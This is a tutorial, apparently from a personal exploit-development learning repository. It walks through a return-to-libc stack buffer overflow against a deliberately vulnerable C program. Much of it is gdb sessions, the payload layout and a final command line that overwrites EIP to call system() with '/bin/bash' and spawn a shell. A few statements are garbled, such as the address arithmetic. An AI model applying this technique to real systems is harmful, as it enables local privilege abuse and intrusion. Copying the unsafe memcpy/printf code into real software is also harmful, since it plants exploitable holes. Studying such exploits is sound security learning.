# Learning
https://github.com/FabioBaroni/awesome-exploit-development

## Start exploiting - Stack Buffer Overflow - Part 2 - Return into libc
When the stack is non-executable, we utilize the trick that called **Return into libc**. It is similar to a normal buffer overflow but but instead of pointing return address to our shellcode we just point the return address to other somewhere else. We point it to the function in libc that used to compiled the vulnerable program and make to the function execute any command as we want.

Let's see how the stack look like when we smashing the stack using normal buffer overflow
```
--- Before exploit -------               ---- After exploit ------     

--------------------------               --------------------------
| Local variable (BUF)   |               | Local variable (BUF)   | Low memory address
--------------------------               --------------------------
| Local variable (BUF)   |               | Local variable (BUF)   |
--------------------------               --------------------------
| Local variable (BUF)   |               | Local variable (BUF)   |
--------------------------               --------------------------
| Local variable (BUF)   |               | Local variable (BUF)   |
--------------------------               --------------------------   Stack (grows â†‘)
| Local variable (BUF)   |               | Local variable (BUF)   |
--------------------------               --------------------------
|           EBP          |   ----->      |      not matter        |
--------------------------               --------------------------
|           RET          |   ----->      |        New RET         |  (1)
--------------------------               --------------------------   
|       Argument2        |   ----->      |         Exit()         |  (2)
--------------------------               --------------------------
|       Argument1        |   ----->      |       Argument2        | 
--------------------------               --------------------------
|       Argument0        |   ----->      |       Argument1        |  High memory address
--------------------------               --------------------------
```

(1) This RET will point to the function in libc (For now it will be address of System() in libc)

(2) address of function that will be executed after the CPU has finished calling System()

Actually Exit() can be a dummy function that called function will return to. By overflow all of these in the stack we simply just has create a new fake stack frame.

We use the same program as the previous but now we will compile the program by leave the stack NX bit to protect the stack from execution.
```c
#include <stdio.h>

int main (int argc, char *argv[]) {
    char buf[256];
    memcpy(buf, argv[1], strlen(argv[1]));
    printf(buf);
}
```

Compile the code with stack executable protection
```
root@BOEING:# cat stack_overflow_basic.c
#include <stdio.h>

int main (int argc, char *argv[]) {
        char buf[256];
        memcpy(buf, argv[1], strlen(argv[1]));
        printf(buf);
}
root@BOEING:# gcc -ggdb -o stack_overflow_with_NX -mpreferred-stack-boundary=2 stack_overflow_basic.c 
...warning...blah...blah...
root@BOEING:# gdb ./stack_overflow_with_NX 
...warning...blah...blah...
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
gdb-peda$ 
```

You will see 

> NX        : ENABLED

That means the stack was non-executable.

Let start examine the program in gdb.
```
gdb-peda$ r $(python -c 'print("A"*265)')
Starting program: /kapi/exploitdev/stack_overflow_with_NX $(python -c 'print("A"*265)')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x80003115 --> 0x0 
EDX: 0xb7fb2870 --> 0x0 
ESI: 0xb7fb1000 --> 0x1aedb0 
EDI: 0xb7fb1000 --> 0x1aedb0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5b0 --> 0x2 
EIP: 0xb7e1a541 (<__libc_start_main+65>:        adc    BYTE PTR [ebx+0x6a04ec],al)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xb7e1a541 <__libc_start_main+65>:   adc    BYTE PTR [ebx+0x6a04ec],al
   0xb7e1a547 <__libc_start_main+71>:   push   0x0
   0xb7e1a549 <__libc_start_main+73>:   push   eax
   0xb7e1a54a <__libc_start_main+74>:   call   0xb7e308e0 <__GI___cxa_atexit>
[------------------------------------stack-------------------------------------]
0000| 0xbffff5b0 --> 0x2 
0004| 0xbffff5b4 --> 0xbffff644 --> 0xbffff768 ("/kapi/exploitdev/stack_overflow_with_NX")
0008| 0xbffff5b8 --> 0xbffff650 --> 0xbffff89a ("XDG_SESSION_ID=161")
0012| 0xbffff5bc --> 0x0 
0016| 0xbffff5c0 --> 0x0 
0020| 0xbffff5c4 --> 0x0 
0024| 0xbffff5c8 --> 0xb7fb1000 --> 0x1aedb0 
0028| 0xbffff5cc --> 0xb7fffc04 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xb7e1a541 in __libc_start_main (main=0x2, argc=0x80000490, argv=0x0, init=0x800004c1 <_start+49>, fini=0x80000600 <main>, rtld_fini=0x2, 
    stack_end=0xbffff644) at ../csu/libc-start.c:220
220     ../csu/libc-start.c: No such file or directory.
gdb-peda$ i r
eax            0x0      0x0
ecx            0x80003115       0x80003115
edx            0xb7fb2870       0xb7fb2870
ebx            0x41414141       0x41414141
esp            0xbffff5b0       0xbffff5b0
ebp            0x41414141       0x41414141
esi            0xb7fb1000       0xb7fb1000
edi            0xb7fb1000       0xb7fb1000
eip            0xb7e1a541       0xb7e1a541 <__libc_start_main+65>
eflags         0x10282  [ SF IF RF ]
cs             0x73     0x73
ss             0x7b     0x7b
ds             0x7b     0x7b
es             0x7b     0x7b
fs             0x0      0x0
gs             0x33     0x33
```

As you saw if we add more 3x"A" the "A" will override EIP but I will use last 4x"B" instead of "A". let's try.
```
gdb-peda$ r $(python -c 'print("A"*264+"B"*4)')
Starting program: /kapi/exploitdev/stack_overflow_with_NX $(python -c 'print("A"*264+"B"*4)')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x80003115 --> 0x0 
EDX: 0xb7fb2870 --> 0x0 
ESI: 0xb7fb1000 --> 0x1aedb0 
EDI: 0xb7fb1000 --> 0x1aedb0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5b0 --> 0x2 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff5b0 --> 0x2 
0004| 0xbffff5b4 --> 0xbffff644 --> 0xbffff765 ("/kapi/exploitdev/stack_overflow_with_NX")
0008| 0xbffff5b8 --> 0xbffff650 --> 0xbffff89a ("XDG_SESSION_ID=161")
0012| 0xbffff5bc --> 0x0 
0016| 0xbffff5c0 --> 0x0 
0020| 0xbffff5c4 --> 0x0 
0024| 0xbffff5c8 --> 0xb7fb1000 --> 0x1aedb0 
0028| 0xbffff5cc --> 0xb7fffc04 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

We've just now override the EIP, but what's the next steps. 

Instead of point the return address to our shellcode we placed onto the stack we will point the return address to the function stored in libc library. System() is a function that execute shell command so we will find the address of System() in libc and point the return address to it. Then we will overide the next four bytes with address of Exit() which normally exit the program (If you don't want this step then just replace address of Exit() with any dummy address). After the CPU has finished executing System() the CPU will look at the top of stack and POP the value of top of the stack which is now address of Exit() and then go to execute Exit() function. Next we will place address of string "/bin/sh" or any shell that we want onto the stack at the next four bytes after the address of Exit(). So let's summary the plan.

We know that we have to push 268 bytes in order to overflow EIP. So the payload should be 

> {NOP or Some Buffer}(264) + {Address of Function()}(4) + {Address Exit()}(4) + {Address of string "/bin/sh"}(4)

1. Find the address of System()
2. Find the address of Exit() or just prepare dummy 4 bytes
3. Find the address string "/bin/sh"
4. Prepare payload in format of {NOP or Some Buffer}(264) + {Address of System()}(4) + {Address Exit()}(4) + {Address of string "/bin/sh"}(4)

### 1. Finding the address of System()
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e3c850 <__libc_system>
```
Then we use 0xb7e3c850 as an address of System()

### 2. Finding the address of Exit()
Actually we just use dummy value for 4 bytes. 0xcccccccc

### 3. Finding the address of string "/bin/sh"
```
gdb-peda$ x/100s $esp
... snipped ...
0xbffff89a:     "XDG_SESSION_ID=230"
0xbffff8ad:     "SHELL=/bin/bash"
0xbffff8bd:     "TERM=vt100"
... snipped ...
```
We need the address of "/bin/bash" so we have to plus the address 0xbffff8ad by 6
Then the address of "/bin/bash" will be 0xbffff8ad = 0xBFFFF8B3

### 4. Preparing payload

Prepare payload in format of 
```
{NOP or Some Buffer}(264) + 
{Address of System()}(4) + 
{Address Exit()}(4) + 
{Address of string "/bin/bash"}(4)
```

### 5. Exploit
```
gdb-peda$ r $(python -c 'print("A"*264) + "\x50\xc8\xe3\xb7" + "\xcc\xcc\xcc\xcc" + "\xb3\xf8\xff\xbf"')
Starting program: /kapi/exploitdev/stack_overflow_with_NX $(python -c 'print("A"*264) + "\x50\xc8\xe3\xb7" + "\xcc\xcc\xcc\xcc" + "\xb3\xf8\xff\xbf"')
[New process 6545]
process 6545 is executing new program: /bin/dash
[New process 6546]
process 6546 is executing new program: /bin/bash
[New process 6547]
process 6547 is executing new program: /usr/bin/tput
[Inferior 4 (process 6547) exited with code 01]
Warning: not running or target is remote
gdb-peda$ root@BOEING:/kapi/exploitdev#
```
